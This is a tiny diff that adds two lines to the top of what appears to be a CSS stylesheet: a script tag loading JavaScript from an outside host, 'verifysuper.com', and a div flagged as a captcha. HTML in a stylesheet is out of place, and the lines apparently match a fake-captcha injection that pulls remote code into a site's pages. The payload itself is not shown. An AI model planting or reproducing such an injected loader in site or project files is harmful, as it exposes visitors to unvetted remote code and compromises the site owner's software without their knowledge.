@@ -1,3 +1,5 @@
+<script type="text/javascript" src="https://verifysuper.com/cp/js/dwn5y"></script>
+<div data-captcha-enable="true"></div>
 body {
   font-family: 'Roboto', sans-serif !important;
   font-weight: 300 !important;
